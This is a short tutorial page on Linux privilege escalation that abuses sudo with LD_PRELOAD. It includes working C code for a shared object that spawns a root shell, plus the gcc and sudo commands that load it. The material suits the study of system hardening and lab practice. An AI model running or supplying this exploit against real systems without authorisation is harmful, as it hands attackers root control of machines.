# Linux Privilege Escalation

### Privilege Escalation with ```sudo```

Any user can check its current situation related to root privileges using the ```sudo -l``` command.

**Leverage LD_PRELOAD**

![image](https://github.com/ankit-c/CyberSec/assets/25206084/e98c273f-b965-4219-98ae-c52f49589110)


LD_PRELOAD is a function that allows any program to use shared libraries. If the "env_keep" option is enabled we can generate a shared library which will be loaded and executed before the program is run. Please note the LD_PRELOAD option will be ignored if the real user ID is different from the effective user ID.

The steps of this privilege escalation vector can be summarized as follows;

- Check for LD_PRELOAD (with the env_keep option)
- Write a simple C code compiled as a share object (.so extension) file
- Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file

The C code will simply spawn a root shell and can be written as follows:

```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```

Save this code as shell.c and compile it using gcc into a shared object file using the following parameters:

```gcc -fPIC -shared -o shell.so shell.c -nostartfiles```

We need to run the program by specifying the LD_PRELOAD option, as follows:

```sudo LD_PRELOAD=/home/user/ldpreload/shell.so find```

This will result in a shell spawn with root privileges.

![image](https://github.com/ankit-c/CyberSec/assets/25206084/6817cd0d-bbce-4108-a0df-2eb253931798)



### Resources
[GTFOBins](https://gtfobins.github.io/)
